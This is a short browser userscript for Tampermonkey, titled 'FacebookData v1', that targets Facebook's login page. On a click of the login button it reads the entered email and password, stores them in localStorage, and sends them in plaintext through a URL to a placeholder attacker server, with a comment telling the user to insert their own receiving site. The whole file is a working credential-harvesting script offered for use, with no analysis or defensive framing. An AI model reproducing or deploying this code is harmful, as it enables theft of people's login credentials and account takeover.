// ==UserScript==
// @name         FacebookData v1
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match         https://www.facebook.com
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    const getButtonData = document.querySelector("._42ft._4jy0._6lth._4jy6._4jy1.selected._51sy");
    getButtonData.addEventListener("click", () => {

        const getIdUsername = document.querySelector(".inputtext._55r1._6luy").value;          // Getter input Gmail
        const getIdPassword = document.querySelector(".inputtext._55r1._6luy._9npi").value;    // Getter input Pass


        const dataFacebook = {
            username: getIdUsername,
            password: getIdPassword,
        };


        const storedData = localStorage.getItem('facebookData');
        let parsedData = storedData ? JSON.parse(storedData) : [];


        parsedData.push(dataFacebook);

        localStorage.setItem('facebookData', JSON.stringify(parsedData));

        // Paste ur page accept request GET.
        window.open(`http://{YourWebsite}/api?usuario=${getIdUsername}&password=${getIdPassword}`, '_blank');
    });
})();
